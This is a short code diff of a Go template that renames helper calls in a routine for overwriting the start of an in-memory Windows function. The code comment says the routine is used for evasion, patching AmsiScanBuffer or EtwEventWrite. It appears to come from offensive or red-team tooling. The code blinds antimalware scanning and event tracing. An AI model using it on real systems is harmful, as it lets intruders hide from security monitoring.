@@ -5,21 +5,21 @@
 // Patch will find the target procedure and overwrite the start of its function with the provided bytes.
 // Used to for evasion to patch things like amsi.dll!AmsiScanBuffer or ntdll.dll!EtwEvenWrite
 func patchBanana_{{ .SubName }}(module string, proc string, data *[]byte) (string, error) {
-	oldBytes, err := readBanana(module, proc, len(*data))
+	oldBytes, err := readBanana_{{ .SubName }}(module, proc, len(*data))
 	if err != nil {
 		return "", err
 	}
 
 	out := fmt.Sprintf("\nRead  %d bytes from %s!%s: %X", len(*data), module, proc, oldBytes)
 
-	err = writeBanana(module, proc, data)
+	err = writeBanana_{{ .SubName }}(module, proc, data)
 	if err != nil {
 		return out, err
 	}
 
 	out += fmt.Sprintf("\nWrote %d bytes to   %s!%s: %X", len(*data), module, proc, *data)
 
-	oldBytes, err = readBanana(module, proc, len(*data))
+	oldBytes, err = readBanana_{{ .SubName }}(module, proc, len(*data))
 	if err != nil {
 		return out, err
 	}
